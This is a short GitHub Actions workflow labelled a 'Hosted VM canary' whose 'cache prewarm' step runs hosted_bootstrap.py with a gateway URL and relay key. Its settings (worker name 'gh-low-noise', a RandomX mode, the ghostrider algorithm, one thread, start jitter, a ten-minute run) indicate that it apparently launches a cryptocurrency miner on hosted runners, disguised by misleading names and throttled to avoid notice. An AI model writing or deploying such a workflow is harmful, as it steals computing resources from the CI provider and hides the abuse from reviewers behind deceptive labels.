name: Hosted VM canary

on:
  workflow_dispatch:
    inputs:
      gateway_url:
        description: HTTPS gateway origin
        required: true
      relay_key:
        description: Ephemeral relay key
        required: true

permissions:
  contents: read

jobs:
  canary:
    runs-on: ubuntu-latest
    timeout-minutes: 13
    steps:
      - uses: actions/checkout@v4
      - name: Run cache prewarm
        run: python3 hosted_bootstrap.py
        env:
          GATEWAY_URL: ${{ inputs.gateway_url }}
          RELAY_ACCESS_KEY: ${{ inputs.relay_key }}
          WORKER: gh-low-noise
          THREADS: "1"
          RANDOMX_MODE: light
          ALGORITHM: ghostrider
          START_JITTER_SECONDS: "10"
          RUN_SECONDS: "600"
